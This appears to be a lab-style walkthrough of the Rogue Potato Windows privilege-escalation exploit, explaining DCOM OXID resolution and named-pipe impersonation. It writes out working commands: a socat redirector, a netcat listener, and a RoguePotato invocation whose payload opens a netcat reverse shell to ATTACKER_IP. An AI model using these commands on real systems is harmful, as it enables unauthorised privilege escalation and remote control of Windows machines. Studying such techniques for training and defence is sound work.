# Rogue Potato

- The exploit will force the victim machine to try and instantiate an object through DCOM against the attacker's machine. To know how to connect to that specific object, the client machine will perform a process known as Object eXporter IDentifier (OXID) resolution. Simpy put, OXID resolution is the process in which a client machine sends the OXID they want to connect to, and receives instructions from the server on how to actually contact the object in question, which in this case is achieved through a named pipe. OXID resolution occurs through port 135/TCP.
- The OXID resolver (controlled by the attacker) will spoof a response to force a connection against a non-existent named pipe that the exploit itself will register in the target system. The named pipe will require authentication, which will then be used to impersonate the connecting user.
- Port 135 is used in any default Windows installation, making it impossible to bind the fake OXID resolver on the same target machine. To overcome this, the exploit will connect back to the attacker machine, which will need to redirect the OXID resolution query back to the target machine on a different port than 135. This can be easily done using socat.

With this in mind, let's start by setting up socat to forward any connection on port 135 of the attacker's machine back to the victim on an arbitrary port, say 9999:
`sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.234.3:9999`

We'll start a netcat listener to receive a reverse shell on our attacker's machine:
`nc -lnvp 4448`

And finally with our web shell to trigger the rougue potato exploit
`c:\tools\roguepotato\RoguePotato.exe -r ATTACKER_IP -e "C:\tools\nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999`

The -l parameter specifies the port on the victim machine where the OXID resolver will listen, which in this case is port 9999. The -r parameter indicates the remote OXID resolver address and points to our attacker machine, which will forward the connection through socat and back to the victim on port 9999. The -e parameter allows us to specify the payload to be run by the exploit, in this case, a netcat reverse shell.


